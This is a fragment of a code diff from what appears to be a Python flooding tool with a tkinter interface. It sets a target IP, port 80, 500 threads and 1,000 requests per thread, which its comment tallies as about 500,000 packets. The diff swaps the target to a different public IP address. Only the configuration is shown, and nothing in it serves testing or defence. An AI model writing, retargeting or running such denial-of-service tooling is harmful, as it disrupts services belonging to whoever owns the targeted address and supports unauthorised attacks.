@@ -5,7 +5,7 @@ import tkinter as tk
 from tkinter import messagebox
 import time
 
-TARGET_IP = "210.56.13.117"
+TARGET_IP = "157.240.13.35"
 PORT = 80
 NUM_THREADS = 500  # Adjust for scale
 REQUESTS_PER_THREAD = 1000  # ~500,000 packets total
